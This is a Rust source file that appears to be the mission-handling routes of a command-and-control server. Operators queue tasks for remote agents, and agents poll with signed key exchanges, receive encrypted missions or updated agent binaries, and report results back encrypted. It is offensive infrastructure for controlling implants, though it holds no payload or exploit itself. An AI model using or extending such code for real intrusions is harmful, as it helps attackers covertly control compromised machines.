use axum::{extract::{Path, State}, http::StatusCode, response::IntoResponse, Json};
use common::{crypto, model::{self, Mission}};
use tracing::{debug, error, warn};

use crate::{routes::AGENT_NOT_FOUND, services, C2State};

use super::MISSION_NOT_FOUND;

pub async fn create(State(c2_state): State<C2State>, body: Json<Mission>) -> impl IntoResponse {
    debug!("{body:#?}");
    if let Ok(mission) =
        services::missions::create(c2_state.conn.clone(), body.agent_id, body.task.clone())
    {
        (StatusCode::CREATED, Json(mission)).into_response()
    } else {
        (StatusCode::INTERNAL_SERVER_ERROR).into_response()
    }
}

pub async fn get_next(
    State(mut c2_state): State<C2State>,
    // headers: HeaderMap,
    crypto_negociation: Json<model::CryptoNegociation>,
) -> impl IntoResponse {
    if let Err(e) = crypto_negociation.verify() {
        error!("{e}");
        return (StatusCode::UNAUTHORIZED).into_response();
    }

    let agent = match services::agents::get_by_identity(
        c2_state.conn.clone(),
        crypto_negociation.identity.to_bytes(),
    ) {
        Ok(Some(agent)) => agent,
        Ok(None) => {
            warn!("Agent not found");
            return (StatusCode::NOT_FOUND, AGENT_NOT_FOUND).into_response();
        }
        Err(e) => {
            error!("{e}");
            return (StatusCode::INTERNAL_SERVER_ERROR).into_response();
        }
    };

    let mission = match services::missions::poll_next(c2_state.conn.clone(), agent.id).await {
        Ok(Some(m)) => m,
        Ok(None) => {
            debug!("No mission for agent {}", agent.id);
            return (StatusCode::NO_CONTENT).into_response();
        }
        Err(e) => {
            error!("{e}");
            return (StatusCode::INTERNAL_SERVER_ERROR).into_response();
        }
    };

    // TODO Create a proper to store & deliver agent versions
    let mission = if let model::Mission {
        task: model::Task::Update(_),
        ..
    } = mission
    {
        // let agent_bin =
        //     std::fs::read("target/x86_64-pc-windows-gnu/release/agent.exe").unwrap();
        let agent_bin = std::fs::read("target/release/agent").unwrap();
        model::Mission {
            task: model::Task::Update(agent_bin),
            ..mission
        }
    } else {
        mission
    };
    //
    debug!("{mission}");
    let mission = serde_json::to_vec(&mission).unwrap();

    (
        StatusCode::OK,
        Json(Some(
            model::CryptoMessage::new(
                &mut c2_state.signing_key,
                crypto_negociation.public_key,
                &mission,
            )
            .unwrap(),
        )),
    )
        .into_response()
}

pub async fn get_report(
    State(c2_state): State<C2State>,
    Path(mission_id): Path<i32>,
) -> impl IntoResponse {
    let mission = match services::missions::get_by_id(c2_state.conn.clone(), mission_id) {
        Ok(Some(m)) => m,
        Ok(None) => {
            return (StatusCode::NOT_FOUND, MISSION_NOT_FOUND).into_response();
        }
        Err(e) => {
            error!("{e}");
            return (StatusCode::INTERNAL_SERVER_ERROR).into_response();
        }
    };

    if mission.completed_at.is_some() {
        (StatusCode::OK, Json(mission.result)).into_response()
    } else {
        (StatusCode::NO_CONTENT).into_response()
    }
}

pub async fn report(
    State(c2_state): State<C2State>,
    Path(mission_id): Path<i32>,
    crypto_message: Json<model::CryptoMessage>,
) -> impl IntoResponse {
    let mission = match services::missions::get_by_id(c2_state.conn.clone(), mission_id) {
        Ok(Some(m)) => m,
        Ok(None) => {
            return (StatusCode::NOT_FOUND, MISSION_NOT_FOUND).into_response();
        }
        Err(e) => {
            error!("{e}");
            return (StatusCode::INTERNAL_SERVER_ERROR).into_response();
        }
    };

    let agent = match services::agents::get_by_id(c2_state.conn.clone(), mission.agent_id) {
        Ok(Some(agent)) => agent,
        Ok(None) => {
            return (StatusCode::NOT_FOUND, AGENT_NOT_FOUND).into_response();
        }
        Err(e) => {
            error!("{e}");
            return (StatusCode::INTERNAL_SERVER_ERROR).into_response();
        }
    };

    if let Err(e) =
        crypto_message.verify(&crypto::VerifyingKey::from_bytes(&agent.identity).unwrap())
    {
        error!("{e}");
        return (StatusCode::UNAUTHORIZED).into_response();
    }

    let Some(private_key) = c2_state
        .ephemeral_private_keys
        .lock()
        .unwrap()
        .remove(&mission_id)
    else {
        warn!("No ephemeral private key for mission {}", mission_id);
        return (StatusCode::UNAUTHORIZED).into_response();
    };
    let decrypted_data = crypto_message.decrypt(private_key).unwrap();

    let result = String::from_utf8(decrypted_data).unwrap();
    services::missions::complete(c2_state.conn.clone(), mission_id, &result).unwrap();

    (StatusCode::ACCEPTED).into_response()
}
